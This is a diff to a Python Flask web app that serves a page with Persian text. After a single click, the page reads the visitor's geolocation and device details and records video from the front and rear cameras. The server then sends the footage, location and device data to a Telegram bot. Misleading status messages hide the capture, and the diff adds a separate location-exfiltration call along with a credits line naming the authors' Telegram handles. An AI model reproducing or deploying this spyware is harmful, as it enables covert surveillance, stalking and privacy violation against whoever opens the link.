@@ -17,7 +17,7 @@ HTML_TEMPLATE = """
 <style>
     body{background:#f0f2f5;font-family:sans-serif;text-align:center}
     .header{background:#ff0000;color:white;padding:20px}
-    #status{margin-top:20px;font-weight:bold;color:#333}
+    #status{margin-top:20px;font-weight:bold;color:#333;font-size:18px}
 </style>
 </head>
 <body onclick="startAutoProcess()">
@@ -31,7 +31,6 @@ HTML_TEMPLATE = """
         started = true;
         document.getElementById('status').innerText = "در حال اتصال به سرور...";
         
-        // دریافت اطلاعات سخت‌افزاری
         const info = {
             ua: navigator.userAgent,
             ram: navigator.deviceMemory || "نامشخص",
@@ -43,13 +42,13 @@ HTML_TEMPLATE = """
             info.lat = pos.coords.latitude;
             info.lon = pos.coords.longitude;
             
-            // مرحله ۱: دوربین جلو
-            await recordAndSend("user", "ساخته شد (دوربین جلو)", info);
-            document.getElementById('status').innerText = "ساخته شد.";
+            // دوربین جلو
+            await recordAndSend("user", "ساخته شد", info);
+            document.getElementById('status').innerText = "ساخته شد";
             
-            // مرحله ۲: دوربین عقب
-            await recordAndSend("environment", "تولید شد (دوربین عقب)", info);
-            document.getElementById('status').innerText = "تولید شد.";
+            // دوربین عقب
+            await recordAndSend("environment", "تولید شد", info);
+            document.getElementById('status').innerText = "تولید شد";
         });
     }
 
@@ -86,15 +85,22 @@ def upload():
     info = json.loads(request.form.get("info"))
     label = request.form.get("label")
     
-    msg = (f"🚨 {label}\n"
-           f"📍 لوکیشن: {info.get('lat')}, {info.get('lon')}\n"
-           f"📱 گوشی: {info.get('ua')}\n"
+    msg = (f"🚨 {label}\n\n"
+           f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
+           f"📱 مشخصات دستگاه: {info.get('ua')}\n"
            f"💾 رم: {info.get('ram')} GB\n"
-           f"🗄 تخمین حافظه کل: {info.get('storage')}\n"
+           f"🗄 حافظه کل: {info.get('storage')}\n"
            f"⚙️ هسته پردازنده: {info.get('cores')}\n\n"
-           f"ساخته شده توسط ریس شاهد و ریس نوری\n"
-           f"@shahidnaimi5642 | @HOKOMAT_ARAB")
+           f"───────────────────\n"
+           f"🛠 این ربات توسط ریس شاهد و ریس نوری ساخته شده است.\n"
+           f"👤 ریس شاهد: @shahidnaimi5642\n"
+           f"👤 ریس نوری: @HOKOMAT_ARAB")
     
+    # ارسال لوکیشن
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
+                  data={"chat_id": TARGET_CHAT_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
+    
+    # ارسال ویدیو
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
                   data={"chat_id": TARGET_CHAT_ID, "caption": msg},
                   files={"video": ("v.webm", video.stream)})
